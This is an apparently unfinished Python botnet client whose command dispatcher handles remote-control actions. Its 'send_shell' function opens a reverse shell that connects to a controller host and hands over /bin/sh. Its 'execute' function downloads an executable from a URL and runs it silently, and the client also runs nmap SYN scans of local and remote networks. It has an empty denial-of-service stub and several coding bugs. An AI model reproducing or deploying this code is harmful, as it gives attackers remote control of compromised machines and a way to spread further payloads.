import netifaces as ni
import nmap
import os
import socket
import subprocess
import wget
import requests
from random import randint
from time import sleep

def send_shell(target,port):
     
    if port == "random":
        port = randint(15000,16000)
    dummy = requests.get("http://{}/connect/{}".format(target,port))
    sleep(2) 
    subprocess.Popen("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format("bot_server",port), shell=True)

def scan_local():
    nm = nmap.PortScanner()
    #TODO Make this more readable
    for iface,gateway in zip(ni.interfaces(),ni.gateways()):
        iface_attr = ni.ifadresses(iface)
        netmask = str(iface_attr['netmask'])
        cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        net_addr = "".join(gateway.split('.')[:len(gateway.split)-1]) + "0"
        #TODO Fix this to allow for larger subnets
        nm.scan(hosts="{ip}/{cidr}".format(net_addr,cidr), arguments='-sS')
        hosts_list = [x for x in nm.all_hosts() if nm[x]['status']['state'] == 'up']

def scan_remote(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target,arguments='-sS')

def http_dos(target):
    print "HERE!"

def execute(url):
    executable = wget.download(url)
    try:
        subprocess.Popen("chmod +x {filename} && ./{filename} 2&1>/dev/null".format(filename=executable),shell=True)
    except:
        pass

def bot_action(parsed_command):

    if parsed_command['command'] == 'send-shell':
        send_shell(parsed_command['target'],parsed_command['port'])
    elif parsed_command['command'] == 'http-dos':
        http_dos(parsed_command['target'])
    elif parsed_command['command'] == 'scan-local':
        scan_local()
    elif parsed_command['command'] == 'scan-remote':
        scan_remote(parsed_command['target'])
    elif parsed_command['command'] == 'exec':
        execute(parsed_command['url'])

    else:
        pass

